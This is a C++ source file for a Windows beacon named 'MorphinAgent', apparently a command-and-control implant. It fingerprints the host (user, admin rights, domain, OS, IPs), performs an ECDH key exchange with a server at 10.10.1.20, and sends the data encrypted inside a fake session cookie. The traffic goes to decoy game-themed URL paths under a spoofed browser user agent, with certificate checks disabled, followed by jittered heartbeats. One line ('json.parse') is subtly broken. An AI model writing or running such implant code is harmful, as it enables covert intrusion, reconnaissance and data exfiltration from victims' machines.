#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <string>
#include <time.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/ec.h>
#include <openssl/sha.h>
#include <nlohmann/json.hpp>
#include <iphlpapi.h>
#include <winsock2.h>
#include <lmcons.h> 

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib") // Added for Registry querying

using json = nlohmann::json;

class MorphinAgent {
private:
    std::string agent_id; // Now populated dynamically in Run()
    std::vector<unsigned char> shared_key;
    int request_count = 0;
    int jitter_base = 40;
    std::vector<std::wstring> endpoints = { 
        L"/power-rangers-about-game/dev/logs/command-center-debug", 
        L"/power-rangers-about-game/admin/morphin-grid-control", 
        L"/power-rangers-about-game/beta/megazord-battle-mode", 
        L"/power-rangers-about-game/user/save-sync/cloud-storage" 
    };

    // --- Utility: Base64 Handling ---
    std::string Base64Encode(const std::vector<unsigned char>& data) {
        BIO *b64 = BIO_new(BIO_f_base64()); BIO *bio = BIO_new(BIO_s_mem());
        bio = BIO_push(b64, bio); BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
        BIO_write(bio, data.data(), (int)data.size()); BIO_flush(bio);
        BUF_MEM *ptr; BIO_get_mem_ptr(bio, &ptr);
        std::string res(ptr->data, ptr->length); BIO_free_all(bio); return res;
    }

    std::vector<unsigned char> Base64Decode(const std::string& b64input) {
        BIO *b64 = BIO_new(BIO_f_base64()); BIO *bio = BIO_new_mem_buf(b64input.c_str(), (int)b64input.length());
        bio = BIO_push(b64, bio); BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
        std::vector<unsigned char> res(b64input.length());
        int len = BIO_read(bio, res.data(), (int)res.size());
        if (len > 0) res.resize(len); else res.clear();
        BIO_free_all(bio); return res;
    }

    // --- MISSING FIX 1: Generate Unique ID per Machine ---
    std::string GenerateAgentID() {
        char comp[MAX_COMPUTERNAME_LENGTH + 1]; DWORD cSize = sizeof(comp); GetComputerNameA(comp, &cSize);
        char user[UNLEN + 1]; DWORD uSize = sizeof(user); GetUserNameA(user, &uSize);
        std::string combined = std::string(comp) + "_" + std::string(user);
        
        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256((unsigned char*)combined.c_str(), combined.length(), hash);
        
        char hex[17]; // Keep first 8 bytes (16 hex chars) for a short, unique ID
        for(int i = 0; i < 8; i++) sprintf_s(hex + (i * 2), 3, "%02x", hash[i]);
        return std::string(hex);
    }

    // --- Discovery Helpers ---
    bool IsAdmin() {
        BOOL isAdmin = FALSE; PSID adminGroup;
        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
        if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
            CheckTokenMembership(NULL, adminGroup, (PBOOL)&isAdmin); 
            FreeSid(adminGroup);
        }
        return (bool)isAdmin;
    }

    // --- MISSING FIX 2: Real OS Version from Registry ---
    std::string GetOSVersion() {
        HKEY hKey;
        char productName[256] = {0};
        char build[256] = {0};
        DWORD pLen = 256, bLen = 256;
        std::string osInfo = "Unknown Windows";

        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
            RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)productName, &pLen);
            RegQueryValueExA(hKey, "CurrentBuild", NULL, NULL, (LPBYTE)build, &bLen);
            osInfo = std::string(productName) + " (Build " + std::string(build) + ")";
            RegCloseKey(hKey);
        }
        return osInfo;
    }

    std::string GetDomainName() {
        char buffer[256]; DWORD size = sizeof(buffer);
        if (GetComputerNameExA(ComputerNameDnsDomain, buffer, &size) && size > 0) return std::string(buffer);
        return "WORKGROUP";
    }

    std::string GetUsername() {
        char name[UNLEN + 1]; DWORD size = UNLEN + 1;
        if (GetUserNameA(name, &size)) return std::string(name);
        return "unknown";
    }

    std::string GetArch() {
        SYSTEM_INFO si; GetNativeSystemInfo(&si);
        if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) return "x64";
        return "x86";
    }

    std::vector<std::string> GetIPs() {
        std::vector<std::string> ips; ULONG len = 15000;
        PIP_ADAPTER_ADDRESSES pAddrs = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), 0, len);
        if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddrs, &len) == NO_ERROR) {
            for (auto p = pAddrs; p; p = p->Next) {
                for (auto u = p->FirstUnicastAddress; u; u = u->Next) {
                    char buf[128]; DWORD bSize = 128;
                    WSAAddressToStringA(u->Address.lpSockaddr, u->Address.iSockaddrLength, NULL, buf, &bSize);
                    ips.push_back(buf);
                }
            }
        }
        HeapFree(GetProcessHeap(), 0, pAddrs); return ips;
    }

    // --- Crypto: AES-256-GCM ---
    std::string Encrypt(std::string pt) {
        if (shared_key.empty()) return "";
        EVP_CIPHER_CTX *c = EVP_CIPHER_CTX_new(); unsigned char iv[12], tag[16];
        std::vector<unsigned char> ct(pt.size() + 32); 
        int len, c_len;
        RAND_bytes(iv, 12); 
        EVP_EncryptInit_ex(c, EVP_aes_256_gcm(), 0, shared_key.data(), iv);
        EVP_EncryptUpdate(c, ct.data(), &len, (unsigned char*)pt.c_str(), (int)pt.size());
        c_len = len; 
        EVP_EncryptFinal_ex(c, ct.data() + len, &len);
        c_len += len; 
        EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_GCM_GET_TAG, 16, tag);
        
        std::vector<unsigned char> pkg; 
        pkg.insert(pkg.end(), iv, iv + 12);
        pkg.insert(pkg.end(), ct.begin(), ct.begin() + c_len);
        pkg.insert(pkg.end(), tag, tag + 16);
        EVP_CIPHER_CTX_free(c); return Base64Encode(pkg);
    }

    std::string Decrypt(std::string b64_ct) {
        if (shared_key.empty() || b64_ct.empty()) return "";
        std::vector<unsigned char> raw = Base64Decode(b64_ct);
        if (raw.size() < 28) return ""; 

        EVP_CIPHER_CTX *c = EVP_CIPHER_CTX_new();
        unsigned char iv[12], tag[16];
        memcpy(iv, raw.data(), 12);
        memcpy(tag, raw.data() + raw.size() - 16, 16);

        std::vector<unsigned char> pt(raw.size());
        int len, pt_len;
        EVP_DecryptInit_ex(c, EVP_aes_256_gcm(), 0, shared_key.data(), iv);
        EVP_DecryptUpdate(c, pt.data(), &len, raw.data() + 12, (int)raw.size() - 28);
        pt_len = len;
        EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_GCM_GET_TAG, 16, tag);
        
        if (EVP_DecryptFinal_ex(c, pt.data() + len, &len) > 0) {
            pt_len += len;
            EVP_CIPHER_CTX_free(c);
            return std::string((char*)pt.data(), pt_len);
        }
        EVP_CIPHER_CTX_free(c);
        return "";
    }

    // --- Networking ---
    std::string SendRequest(std::string b64_cookie) {
        std::string response;
        HINTERNET hS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
        if (!hS) return "";
        HINTERNET hC = WinHttpConnect(hS, L"10.10.1.20", INTERNET_DEFAULT_HTTPS_PORT, 0);
        HINTERNET hR = WinHttpOpenRequest(hC, L"GET", endpoints[rand() % 4].c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
        
        std::wstring h = L"Connection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nCookie: session_id=" + 
                         std::wstring(b64_cookie.begin(), b64_cookie.end()) + L"; theme=dark\r\n";

        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

        if (WinHttpSendRequest(hR, h.c_str(), -1, 0, 0, 0, 0)) {
            if (WinHttpReceiveResponse(hR, 0)) {
                DWORD size = 0; do {
                    WinHttpQueryDataAvailable(hR, &size); if (size == 0) break;
                    char* buf = new char[size + 1]; ZeroMemory(buf, size + 1);
                    DWORD read = 0; WinHttpReadData(hR, buf, size, &read);
                    response.append(buf); delete[] buf;
                } while (size > 0);
            }
        }
        WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); return response;
    }

    void PhaseA_Handshake() {
        //std::cout << "[*] Morphin Grid: Initiating Handshake..." << std::endl;
        EVP_PKEY_CTX *pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_EC, NULL);
        EVP_PKEY_keygen_init(pctx); EVP_PKEY_CTX_set_ec_paramgen_curve_nid(pctx, NID_X9_62_prime256v1);
        EVP_PKEY *local = NULL; EVP_PKEY_keygen(pctx, &local);
        
        unsigned char *p_buf = NULL; int p_len = i2d_PUBKEY(local, &p_buf);
        std::string s_pub_b64 = SendRequest(Base64Encode({p_buf, p_buf + p_len}));

        std::vector<unsigned char> s_pub_bytes = Base64Decode(s_pub_b64);
        if (!s_pub_bytes.empty()) {
            const unsigned char* p = s_pub_bytes.data();
            EVP_PKEY* peer = d2i_PUBKEY(NULL, &p, (long)s_pub_bytes.size());
            EVP_PKEY_CTX* dctx = EVP_PKEY_CTX_new(local, NULL);
            EVP_PKEY_derive_init(dctx); EVP_PKEY_derive_set_peer(dctx, peer);
            size_t s_len; EVP_PKEY_derive(dctx, NULL, &s_len);
            std::vector<unsigned char> secret(s_len); EVP_PKEY_derive(dctx, secret.data(), &s_len);
            shared_key.resize(32); SHA256(secret.data(), secret.size(), shared_key.data());
            EVP_PKEY_free(peer); EVP_PKEY_CTX_free(dctx);
        }
        OPENSSL_free(p_buf); EVP_PKEY_free(local); EVP_PKEY_CTX_free(pctx);
    }

public:
    void Run() {
        WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa); srand((unsigned)time(0));
        
        // Dynamically assign an ID based on machine hardware/user
        agent_id = GenerateAgentID(); 

        while (1) {
            try {
                if (request_count == 0 || request_count == 6) {
                    PhaseA_Handshake(); 
                    request_count = 1; 
                } else if (request_count == 1) {
                    //std::cout << "[*] Phase B: Collecting System Discovery Info..." << std::endl;
                    Sleep((10 + (rand() % 31)) * 1000); 
                    
                    char cn[MAX_COMPUTERNAME_LENGTH + 1]; DWORD s = sizeof(cn); GetComputerNameA(cn, &s);
                    json sys = {
                        {"id", agent_id}, {"hostname", cn}, {"username", GetUsername()},
                        {"is_admin", IsAdmin()}, {"domain", GetDomainName()}, {"os", GetOSVersion()},
                        {"arch", GetArch()}, {"process_id", GetCurrentProcessId()}, {"ip", GetIPs()}
                    };
                    SendRequest(Encrypt(sys.dump())); 
                    request_count++;
                } else {
                    //std::cout << "[+] Ranger Heartbeat #" << request_count << std::endl;
                    json hb = {{"id", agent_id}, {"status", "active"}};
                    std::string res = SendRequest(Encrypt(hb.dump()));
                    
                    if (!res.empty()) {
                        try {
                            std::string pt_res = Decrypt(res); 
                            if (!pt_res.empty()) {
                                auto j = json.parse(pt_res);
                                if (j.contains("new_jitter")) {
                                    this->jitter_base = j["new_jitter"];
                                    //std::cout << "[!] Server updated Frequency to: " << jitter_base << "s" << std::endl;
                                }
                            }
                        } catch (...) {}
                    }
                    request_count++;
                }
            } catch (...) {}
            int sleep_time = jitter_base + (rand() % 21);
            Sleep(sleep_time * 1000);
        }
        WSACleanup();
    }
};

int main() { MorphinAgent a; a.Run(); return 0; }